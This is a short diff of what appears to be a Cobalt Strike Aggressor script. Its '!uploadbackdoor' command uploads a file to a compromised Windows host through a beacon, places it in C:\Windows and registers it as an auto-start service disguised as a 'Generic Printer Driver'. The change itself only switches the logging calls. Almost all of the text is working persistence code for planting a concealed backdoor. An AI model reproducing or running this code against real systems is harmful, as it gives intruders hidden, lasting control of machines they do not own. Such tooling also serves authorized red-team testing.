@@ -13,13 +13,13 @@ sub servicefilename {
 
 command !uploadbackdoor {
 	println("\c4Uploading backdoor on beacon $1 using file $2 ");
-	elog("Attempting to publish backdoor on beacon $1 ");
+	binput($1, "Attempting to publish backdoor service");
 	bcd($1, "C:\\Windows\\");
 	println("\c4Changed directory on beacon $1 to C:\\Windows\\");
 	bupload($1, script_resource("$2"));
 	servicefilename($2);
 	bshell($1, "sc create GenericPrinterDriver binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \"Generic Printer Driver Support\"");
 	bshell($1, "sc start GenericPrinterDriver");
-	elog("Backdoor service created on beacon $1 using $servicebackdoorfilename ");
+	binput ($1, "Backdoor service created using $servicebackdoorfilename ");
 	println("\c9[+] Backdoor creation complete!");
 }
